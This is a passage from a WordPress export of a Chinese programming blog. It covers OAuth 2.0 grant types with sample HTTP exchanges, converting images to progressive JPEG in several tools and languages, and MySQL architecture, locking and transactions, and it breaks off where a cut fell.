授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与"服务提供商"的认证服务器进行互动。
<a href="http://storage.veitor.net/uploads/2014/11/bg20140512031.png"><img class="aligncenter size-full wp-image-403" alt="bg2014051203" src="http://storage.veitor.net/uploads/2014/11/bg20140512031.png" width="764" height="529" /></a>
&nbsp;
它的步骤如下：
<blockquote>（A）用户访问客户端，后者将前者导向认证服务器。
（B）用户选择是否给予客户端授权。
（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。
（D）客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。
（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。</blockquote>
下面是上面这些步骤所需要的参数。
A步骤中，客户端申请认证的URI，包含以下参数：
<ul>
	<li>response_type：表示授权类型，必选项，此处的值固定为"code"</li>
	<li>client_id：表示客户端的ID，必选项</li>
	<li>redirect_uri：表示重定向URI，可选项</li>
	<li>scope：表示申请的权限范围，可选项</li>
	<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>
</ul>
下面是一个例子。
<blockquote>GET /authorize?response_type=code&amp;amp;client_id=s6BhdRkqt3&amp;amp;state=xyz
&amp;amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com</blockquote>
C步骤中，服务器回应客户端的URI，包含以下参数：
<ul>
	<li>code：表示授权码，必选项。该码的有效期应该很短，通常设为10分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。</li>
	<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>
</ul>
下面是一个例子。
<blockquote>HTTP/1.1 302 Found
Location: &lt;a href="https://client.example.com/cb"&gt;https://client.example.com/cb&lt;/a&gt;?code=SplxlOBeZQQYbYS6WxSbIA
&amp;amp;state=xyz</blockquote>
D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：
<ul>
	<li>grant_type：表示使用的授权模式，必选项，此处的值固定为"authorization_code"。</li>
	<li>code：表示上一步获得的授权码，必选项。</li>
	<li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</li>
	<li>client_id：表示客户端ID，必选项。</li>
</ul>
下面是一个例子。
<blockquote>POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded
grant_type=authorization_code&amp;amp;code=SplxlOBeZQQYbYS6WxSbIA
&amp;amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb</blockquote>
E步骤中，认证服务器发送的HTTP回复，包含以下参数：
<ul>
	<li>access_token：表示访问令牌，必选项。</li>
	<li>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型。</li>
	<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>
	<li>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。</li>
	<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>
</ul>
下面是一个例子。
<pre class="lang:xhtml decode:true">HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache
{
"access_token":"2YotnFZFEjr1zCsicMWpAA",
"token_type":"example",
"expires_in":3600,
"refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
"example_parameter":"example_value"
}</pre>
&nbsp;
从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。
<h2>七、简化模式</h2>
简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。
<a href="http://storage.veitor.net/uploads/2014/11/bg20140512032.png"><img class="aligncenter size-full wp-image-404" alt="bg2014051203" src="http://storage.veitor.net/uploads/2014/11/bg20140512032.png" width="671" height="573" /></a>
&nbsp;
它的步骤如下：
<blockquote>（A）客户端将用户导向认证服务器。
（B）用户决定是否给于客户端授权。
（C）假设用户给予授权，认证服务器将用户导向客户端指定的"重定向URI"，并在URI的Hash部分包含了访问令牌。
（D）浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值。
（E）资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌。
（F）浏览器执行上一步获得的脚本，提取出令牌。
（G）浏览器将令牌发给客户端。</blockquote>
下面是上面这些步骤所需要的参数。
A步骤中，客户端发出的HTTP请求，包含以下参数：
<ul>
	<li>response_type：表示授权类型，此处的值固定为"token"，必选项。</li>
	<li>client_id：表示客户端的ID，必选项。</li>
	<li>redirect_uri：表示重定向的URI，可选项。</li>
	<li>scope：表示权限范围，可选项。</li>
	<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>
</ul>
下面是一个例子。
<blockquote>GET /authorize?response_type=token&amp;amp;client_id=s6BhdRkqt3&amp;amp;state=xyz
&amp;amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com</blockquote>
C步骤中，认证服务器回应客户端的URI，包含以下参数：
<ul>
	<li>access_token：表示访问令牌，必选项。</li>
	<li>token_type：表示令牌类型，该值大小写不敏感，必选项。</li>
	<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>
	<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>
	<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>
</ul>
下面是一个例子。
<blockquote>HTTP/1.1 302 Found
Location: &lt;a href="http://example.com/cb"&gt;http://example.com/cb&lt;/a&gt;#access_token=2YotnFZFEjr1zCsicMWpAA
&amp;amp;state=xyz&amp;amp;token_type=example&amp;amp;expires_in=3600</blockquote>
在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。
根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。
<h2>八、密码模式</h2>
密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。
在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。
<a href="http://storage.veitor.net/uploads/2014/11/bg20140512033.png"><img class="aligncenter size-full wp-image-405" alt="bg2014051203" src="http://storage.veitor.net/uploads/2014/11/bg20140512033.png" width="799" height="406" /></a>
&nbsp;
它的步骤如下：
<blockquote>（A）用户向客户端提供用户名和密码。
（B）客户端将用户名和密码发给认证服务器，向后者请求令牌。
（C）认证服务器确认无误后，向客户端提供访问令牌。</blockquote>
B步骤中，客户端发出的HTTP请求，包含以下参数：
<ul>
	<li>grant_type：表示授权类型，此处的值固定为"password"，必选项。</li>
	<li>username：表示用户名，必选项。</li>
	<li>password：表示用户的密码，必选项。</li>
	<li>scope：表示权限范围，可选项。</li>
</ul>
下面是一个例子。
<blockquote>POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded
grant_type=password&amp;amp;username=johndoe&amp;amp;password=A3ddj3w</blockquote>
C步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。
<pre class="lang:yaml decode:true">HTTP/1.1 200 OK
     Content-Type: application/json;charset=UTF-8
     Cache-Control: no-store
     Pragma: no-cache
     {
       "access_token":"2YotnFZFEjr1zCsicMWpAA",
       "token_type":"example",
       "expires_in":3600,
       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
       "example_parameter":"example_value"
     }</pre>
&nbsp;
上面代码中，各个参数的含义参见《授权码模式》一节。
整个过程中，客户端不得保存用户的密码。
<h2>九、客户端模式</h2>
客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向"服务提供商"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务，其实不存在授权问题。
<a href="http://storage.veitor.net/uploads/2014/11/bg20140512034.png"><img class="aligncenter size-full wp-image-406" alt="bg2014051203" src="http://storage.veitor.net/uploads/2014/11/bg20140512034.png" width="802" height="183" /></a>
&nbsp;
它的步骤如下：
<blockquote>（A）客户端向认证服务器进行身份认证，并要求一个访问令牌。
（B）认证服务器确认无误后，向客户端提供访问令牌。</blockquote>
A步骤中，客户端发出的HTTP请求，包含以下参数：
<ul>
	<li>granttype：表示授权类型，此处的值固定为"clientcredentials"，必选项。</li>
	<li>scope：表示权限范围，可选项。</li>
</ul>
<blockquote>POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded
grant_type=client_credentials</blockquote>
认证服务器必须以某种方式，验证客户端身份。
B步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。
<pre class="lang:php decode:true">HTTP/1.1 200 OK
     Content-Type: application/json;charset=UTF-8
     Cache-Control: no-store
     Pragma: no-cache
     {
       "access_token":"2YotnFZFEjr1zCsicMWpAA",
       "token_type":"example",
       "expires_in":3600,
       "example_parameter":"example_value"
     }</pre>
&nbsp;
上面代码中，各个参数的含义参见《授权码模式》一节。
<h2>十、更新令牌</h2>
如果用户访问的时候，客户端的"访问令牌"已经过期，则需要使用"更新令牌"申请一个新的访问令牌。
客户端发出更新令牌的HTTP请求，包含以下参数：
<ul>
	<li>granttype：表示使用的授权模式，此处的值固定为"refreshtoken"，必选项。</li>
	<li>refresh_token：表示早前收到的更新令牌，必选项。</li>
	<li>scope：表示申请的授权范围，不可以超出上一次申请的范围，如果省略该参数，则表示与上一次一致。</li>
</ul>
下面是一个例子。
<blockquote>POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded
grant_type=refresh_token&amp;amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</blockquote>
&nbsp;
（完）
原文地址：http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>399</wp:post_id>
		<wp:post_date><![CDATA[2014-11-26 07:09:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-26 07:09:32]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[oauth2-0%e8%ae%a4%e8%af%81%e5%92%8c%e6%8e%88%e6%9d%83%e5%8e%9f%e7%90%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e6%8e%88%e6%9d%83"><![CDATA[授权]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="post_tag" nicename="%e8%ae%a4%e8%af%81"><![CDATA[认证]]></category>
						</item>
					<item>
		<title>使用渐进式JPEG来提升用户体验</title>
		<link>http://wp.veitor.net/2014/11/28/%e4%bd%bf%e7%94%a8%e6%b8%90%e8%bf%9b%e5%bc%8fjpeg%e6%9d%a5%e6%8f%90%e5%8d%87%e7%94%a8%e6%88%b7%e4%bd%93%e9%aa%8c/</link>
		<pubDate>Fri, 28 Nov 2014 04:35:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=409</guid>
		<description></description>
		<content:encoded><![CDATA[今天才认识到原来JPEG文件有两种保存方式他们分别是Baseline JPEG(标准型)和Progressive JPEG(渐进式)。两种格式有相同尺寸以及图像数据，他们的扩展名也是相同的，唯一的区别是二者显示的方式不同。
<strong>Baseline JPEG</strong>
这种类型的JPEG文件存储方式是按从上到下的扫描方式，把每一行顺序的保存在JPEG文件中。打开这个文件显示它的内容时，数据将按照存储时的顺序从上到下一行一行的被显示出来，直到所有的数据都被读完，就完成了整张图片的显示。如果文件较大或者网络下载速度较慢，那么就会看到图片被一行行加载的效果，这种格式的JPEG没有什么优点，因此，一般都推荐使用Progressive JPEG。
<a href="http://storage.veitor.net/uploads/2014/11/baseline.gif"><img class="aligncenter size-full wp-image-410" alt="baseline" src="http://storage.veitor.net/uploads/2014/11/baseline.gif" width="310" height="248" /></a>
&nbsp;
<strong>Progressive JPEG</strong>
和Baseline一遍扫描不同，Progressive JPEG文件包含多次扫描，这些扫描顺寻的存储在JPEG文件中。打开文件过程中，会先显示整个图片的模糊轮廓，随着扫描次数的增加，图片变得越来越清晰。这种格式的主要优点是在网络较慢的情况下，可以看到图片的轮廓知道正在加载的图片大概是什么。在一些网站打开较大图片时，你就会注意到这种技术。
<a href="http://storage.veitor.net/uploads/2014/11/progressive.gif"><img class="aligncenter size-full wp-image-411" alt="progressive" src="http://storage.veitor.net/uploads/2014/11/progressive.gif" width="310" height="248" /></a>
&nbsp;
渐进式图片带来的好处是可以让用户在没有下载完图片就可以看到最终图像的大致轮廓，一定程度上可以提升用户体验。(瀑布留的网站建议还是使用标准型的)
<a href="http://storage.veitor.net/uploads/2014/11/baseline_vs_progressive.jpg"><img class="aligncenter size-full wp-image-412" alt="baseline_vs_progressive" src="http://storage.veitor.net/uploads/2014/11/baseline_vs_progressive.jpg" width="550" height="197" /></a>
&nbsp;
另外渐进式的图片的大小并不会和基本的图片大小相差很多，有时候可能会比基本图片更小。渐进式的图片的缺点就是吃用户的CPU和内存，不过对于现在的电脑来说这点图片的计算并不算什么。
说了这边多下面就改讲讲怎么讲图片保存为或者转化为Progressive JPEG了。
1、PhotoShop
在photoshop中有“存储为web所用格式”，打开后选择“连续”就是渐进式JPEG。
<a href="http://storage.veitor.net/uploads/2014/11/photoshop.png"><img class="aligncenter size-full wp-image-413" alt="photoshop" src="http://storage.veitor.net/uploads/2014/11/photoshop.png" width="294" height="284" /></a>
&nbsp;
2、Linux
检测是否为progressive jpeg ： identify -verbose filename.jpg | grep Interlace(如果输出 None 说明不是progressive jpeg；如果输出 Plane 说明是 progressive jpeg。)
将basic jpeg转换成progressive jpeg：&gt; convert infile.jpg -interlace Plane outfile.jpg
3、PHP
使用<a href="http://php.net/manual/en/function.imageinterlace.php">imageinterlace</a>和<a href="http://www.php.net/manual/en/function.imagejpeg.php">imagejpeg</a>函数我们可以轻松解决转换问题。
<pre class="lang:php decode:true ">&lt;?php
    $im = imagecreatefromjpeg('pic.jpg');
    imageinterlace($im, 1);
    imagejpeg($im, './php_interlaced.jpg', 100);
    imagedestroy($im);
?&gt;</pre>
4、Python
<pre class="lang:python decode:true crayon-selected">import PIL
from exceptions import IOError
&amp;nbsp;&amp;nbsp;
img = PIL.Image.open("c:\\users\\biaodianfu\\pictures\\in.jpg")
destination = "c:\\users\\biaodianfu\\pictures\\test.jpeg"
try:
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;img.save(destination, "JPEG", quality=80, optimize=True, progressive=True)
except IOError:
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PIL.ImageFile.MAXBLOCK = img.size[0] * img.size[1]
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;img.save(destination, "JPEG", quality=80, optimize=True, progressive=True)</pre>
5、jpegtran
jpegtran -copy none -progressive &lt;inputfile&gt; &lt;outputfile&gt;
6、C#
<pre class="lang:c# decode:true ">using (Image source = Image.FromFile(@"D:\temp\test2.jpg")) {
    ImageCodecInfo codec = ImageCodecInfo.GetImageEncoders().First(c =&gt; c.MimeType == "image/jpeg");
    EncoderParameters parameters = new EncoderParameters(3);
    parameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 100L);
    parameters.Param[1] = new EncoderParameter(System.Drawing.Imaging.Encoder.ScanMethod, (int)EncoderValue.ScanMethodInterlaced);
    parameters.Param[2] = new EncoderParameter(System.Drawing.Imaging.Encoder.RenderMethod, (int)EncoderValue.RenderProgressive);
    source.Save(@"D:\temp\saved.jpg", codec, parameters);
}</pre>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>409</wp:post_id>
		<wp:post_date><![CDATA[2014-11-28 04:35:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-28 04:35:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bd%bf%e7%94%a8%e6%b8%90%e8%bf%9b%e5%bc%8fjpeg%e6%9d%a5%e6%8f%90%e5%8d%87%e7%94%a8%e6%88%b7%e4%bd%93%e9%aa%8c]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e4%bd%93%e9%aa%8c"><![CDATA[体验]]></category>
		<category domain="post_tag" nicename="%e5%89%8d%e7%ab%af"><![CDATA[前端]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>简单了解mysql逻辑架构</title>
		<link>http://wp.veitor.net/2014/11/30/%e7%ae%80%e5%8d%95%e4%ba%86%e8%a7%a3mysql%e9%80%bb%e8%be%91%e6%9e%b6%e6%9e%84/</link>
		<pubDate>Sun, 30 Nov 2014 13:36:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=415</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://storage.veitor.net/uploads/2014/11/2012031510324452.png"><img class="aligncenter size-full wp-image-416" alt="2012031510324452" src="http://storage.veitor.net/uploads/2014/11/2012031510324452.png" width="556" height="384" /></a>
如图，mysql逻辑架构大致分为三层。
第一层，服务层(为客户端服务)：这并不是mysql所独有的，很多基于网络的客户端/服务器的工具或者服务都有这样的类似架构，比如为请求做连接处理，授权认证，安全等。
第二层，核心层：这是一个比较有意思的部分，大多数mysql核心服务功能都在这一层，包括查询解析、分析、优化、缓存以及所有的内置函数（例如日期、时间、数学和加密函数），所有跨存储引擎的功能都在这一层实现：存储过程、触发器、视图等。
第三层，存储引擎层：存储引擎负责Mysql中数据的存储和提取，每个存储引擎都有它的优势和劣势。服务器（即上面的核心层）通过API与存储引擎进行通信。这些接口屏蔽了不同存储引擎之间的差异，使得这些差异对上层的查询过程透明。存储引擎API包含几十个底层函数，用于执行注入“开始一个事务”或者“根据主键提取一行记录”等操作。但存储引擎不会去解析SQL（InnoDB是一个例外，它会解析外键定义，因为Mysql服务器本身没有实现该功能），不同存储引擎之间也不会相互通信，而只是简单的响应上层服务器的请求。
下面进一步了解第一层和第二层。
<blockquote>
<h1 class="crayon-selected">连接管理与安全性（第一层 服务层）</h1>
</blockquote>
<p style="text-align: center;"><img class="aligncenter size-full wp-image-417" alt="2012031510114191" src="http://storage.veitor.net/uploads/2014/11/2012031510114191.png" width="466" height="251" /></p>
<ul>
	<li>每个客户端链接都会在服务器进程中拥有一个线程，这个链接的查询只会在这个单独的线程中进行，即每个连接的查询都在一个进程中的线程完成。</li>
	<li>服务层会负责缓存线程，因此不需要为每个新建的连接创建一个线程或销毁已经使用的线程，类似线程池。</li>
</ul>
<h3>认证流程</h3>
<img class="aligncenter" alt="2012031510220113" src="http://storage.veitor.net/uploads/2014/11/2012031510220113.png" width="349" height="288" />
&nbsp;
当客户端（应用）连接到mysql服务器时，服务器需要对其进行认证。认证基于原始主机信息和密码。如果使用了安全套接字（SSL）的方式连接，还可以使用X.509证书认证。一旦客户端连接成功，服务器会继续验证该客户端是否具有执行某个特定查询的权限。例如，是否允许客户端对world数据库的country数据表执行select语句。
<blockquote>
<h1>优化与执行（第二层 核心层）</h1>
</blockquote>
<img alt="2012031510482383" src="http://storage.veitor.net/uploads/2014/11/2012031510482383.png" width="362" height="426" />
&nbsp;
<div>mysql会解析查询，并创建内部数据结构（解析树），然后对其进行各种优化，包括重写查询、决定表的读取顺序，以及选择合适的索引等。</div>
<div>在解析查询之前，服务器会“询问”是否进行了查询缓存(只能缓存SELECT语句和相应结果)。缓存过的直接返回结果，未缓存的就需要进行解析查询，优化，重新执行返回结果。</div>
<div></div>
<div>参考文献《高性能Mysql》</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>415</wp:post_id>
		<wp:post_date><![CDATA[2014-11-30 13:36:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-30 13:36:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%ae%80%e5%8d%95%e4%ba%86%e8%a7%a3mysql%e9%80%bb%e8%be%91%e6%9e%b6%e6%9e%84]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
						</item>
					<item>
		<title>了解mysql的并发控制</title>
		<link>http://wp.veitor.net/2014/12/02/%e4%ba%86%e8%a7%a3mysql%e7%9a%84%e5%b9%b6%e5%8f%91%e6%8e%a7%e5%88%b6/</link>
		<pubDate>Tue, 02 Dec 2014 14:08:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=427</guid>
		<description></description>
		<content:encoded><![CDATA[关于mysql的并发控制，主要涉及“锁”这个概念。本篇博文为纯文字理论，看似可能有点枯燥，但易于理解也易懂。
何谓“锁”，“锁”是用来干嘛的？我们先来看一个例子，我们以Unix系统的email box为例，这是一个邮箱，邮箱中的所有邮件都串行在一起，彼此首尾相连。这种格式对于读取和分析邮件信息非常友好，同时投递邮件也很容易，只要在文件末尾附加新的邮件内容即可。
那么，问题来了！
如果有两个进程同一时刻对同一个邮箱投递邮件，会发生什么情况？显然，邮箱的数据会被破坏，两份邮件的内容会交叉的附加在邮箱文件的末尾。那么我们就需要一种东西来控制邮件的投递，使得一个客户投递邮件时，将邮箱锁住，此时其他客户无法对此邮箱进行投递而进入等待，直到这个客户投递完毕解开锁才能进行投递。这就是所谓的“锁”，与mysql中的“锁”概念类似。
<strong>在mysql中主要有两种锁，一个是共享锁（shared lock），一个排他锁（exclusive lock），也分别称为读锁（read lock）和写锁（write lock）。</strong>
读锁是共享的，或者说是相互不阻塞的。多个客户在同一时刻可以同时读取同一个资源，而互不干扰。写锁则是排他的，也就是说一个写锁会阻塞其他的写锁和读锁，这是处于安全策略的考虑，只有这样，才能确保在给定的时间内只有一个用户能执行写入，并防止其他用户读取正在写入的同一资源。
<blockquote>
<h1>锁粒度</h1>
</blockquote>
mysql该如何加锁？修改数据时将全部数据都锁定？还是只是锁定要修改的那一块数据？加锁会不会影响性能？这就是要讨论的锁的粒度大小。
锁的粒度影响着共享资源的并发性，所以加锁时应该选择明确的锁定对象。尽量只锁定需要修改的部分数据，而不是所有数据。更理想的方式是，只对会修改的数据片进行精确的锁定。任何时候，在给定的资源上，锁定的数据量越少，则系统的并发程度越高。
however，加锁也是需要消耗资源的，锁的各种操作，包括获得锁、检查锁是否已经解除、释放锁等，都会增加系统开销。
因此，我们需要在追求并发性和数据安全性之间寻求平衡，即如何加锁，制定一个锁策略。
mysql中提供了多种的加锁选择，每种mysql存储引擎都可以实现自己的锁策略和锁粒度。在存储引擎的设计中，锁管理是个非常重要的决定。将锁粒度固定在某个级别，可以为某些特定的应用场景提供更好的性能，但同时却会失去对另外一些场景的良好支持。好在mysql支持多个存储引擎的架构，所以不需要单一的通用的解决方案。
<strong>下面介绍两种锁策略：</strong>
<blockquote>
<h2>表锁（table lock）</h2>
</blockquote>
表锁是mysql中最基本的锁策略，并且是开销最小的策略。表锁非常类似前文描述的邮箱加锁机制：它会锁定整张表。一个用户在对表进行写操作（插入、修改、删除）钱，需要先获得写锁，这会阻塞其他用户对该表的所有读写操作。只有没有写锁时，其他读取的用户才能获得读锁，读锁之间是不会相互阻塞的。
在特定的场景中，表锁也可能有良好的性能。写锁比读锁有更高的优先级，因此一个写锁请求可能会被插入到读锁队列的前面，而读锁则不能插入到写锁的前面。
尽管存储引擎可以管理自己的锁，mysql本身还是会使用各种有效的表锁来实现不同的目的。例如，服务器（详见前面的<a title="简单了解mysql逻辑架构" href="http://www.veitor.net/article/415.html" target="_blank" rel="noopener noreferrer">逻辑架构</a>一文）会为诸如ALTER TABLE之类的语句使用表锁，而忽略存储引擎的锁机制。
<blockquote>
<h2>行级锁（row-level lock）</h2>
</blockquote>
行级锁可以最大程度的支持并发处理，同时也带来了最大的锁开销。在InnoDB以及其他一些存储引擎中实现了行级锁。行级锁只在存储引擎层实现，而mysql服务器层没有实现。
&nbsp;
以上这些就是对mysql并发控制的理解，通过锁机制来有效控制并发。
如有疑问欢迎留言探讨，毕竟我也是刚开始深入学习mysql。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>427</wp:post_id>
		<wp:post_date><![CDATA[2014-12-02 14:08:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-12-02 14:08:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%ba%86%e8%a7%a3mysql%e7%9a%84%e5%b9%b6%e5%8f%91%e6%8e%a7%e5%88%b6]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="%e5%ad%98%e5%82%a8%e5%bc%95%e6%93%8e"><![CDATA[存储引擎]]></category>
		<category domain="post_tag" nicename="%e5%b9%b6%e5%8f%91"><![CDATA[并发]]></category>
						</item>
					<item>
		<title>了解mysql事务</title>
		<link>http://wp.veitor.net/2014/12/04/%e4%ba%86%e8%a7%a3mysql%e4%ba%8b%e5%8a%a1/</link>
		<pubDate>Thu, 04 Dec 2014 14:20:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=430</guid>
		<description></description>
		<content:encoded><![CDATA[mysql事务可能大多数人都有所了解，本篇博文主要记录我了解的事务的一些细节之处，也必然对事务能有进一步的理解。
看过《高性能mysql》一书，上面写道事务就是一组原子性的sql查询，或者说一个独立的工作单元。可能这句话并不是那么好理解，什么叫原子性？什么又是独立的工作单元？看几个例子和几个名词解释或许更加有帮助。
在事务中，如果数据库引擎能够成功地对数据库应用一组查询的全部语句，那么就执行这组查询。如果其中有任何一条语句因为崩溃或其他原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。
讲解事务最经典的例子还是银行转帐。假设银行的数据库有两张表：支票表和储蓄表，现在要从用户A的支票账户转义200元到他的储蓄帐户，那么至少需要三个步骤
<blockquote>1、检查支票账户的余额高于200元。
2、从支票账户余额中减去200元。
3、在储蓄帐户余额中增加200元。</blockquote>
上面三个步骤操作必须打包在一个事务中，其中任何一个步骤失败，则必须回滚所有步骤，即之前操作的几个步骤都失效。
一般可以用START TRANSACTION语句开始一个事务，然后要么使用COMMIT提交事务将修改的数据持久保留，要么使用ROLLBACK撤销所有的修改。上面三个步骤用语句可以这样表示：
<blockquote>1、START TRANSACTION;
2、SELECT balance FROM checking WHERE customer_id=123123;
3、UPDATE checking SET balance = balance -200 WHERE customer_id=123123;
4、UPDATE savings SET balance = =balance + 200 WHERE customer_id=123123;
5、COMMIT;</blockquote>
单纯的讲事务还是不够的。试想一下，如果执行到第四条语句时服务器崩溃了，会发生什么？用户可能会损失200元。再假如，在执行到第三条语句和第四条语句之间时，另一个进程要删除支票账户的所有余额，那么结果可能就是银行在不知情的状况下白了用户200元。
由此看来空谈事务还是不够的，需要通过严格的ACID测试，一个运作良好的事务系统必须具备四个特性，即ACID。这是本篇博文重点要记的，也是我所说的需要记忆的细节之处。下面就介绍一下ACID：
<blockquote>
<h3>A、原子性（atomicity）</h3>
</blockquote>
